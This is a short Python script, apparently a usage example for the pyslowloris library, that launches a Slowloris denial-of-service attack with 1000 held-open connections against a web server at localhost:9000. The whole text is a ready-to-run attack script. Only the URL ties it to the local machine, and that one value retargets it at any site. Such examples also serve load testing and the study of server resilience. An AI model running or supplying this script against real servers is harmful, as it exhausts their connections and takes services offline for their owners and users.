from pyslowloris import HostAddress, SlowLorisAttack

url = HostAddress.from_url("http://localhost:9000")
connections_count = 1000

loris = SlowLorisAttack(url, connections_count)
loris.start()
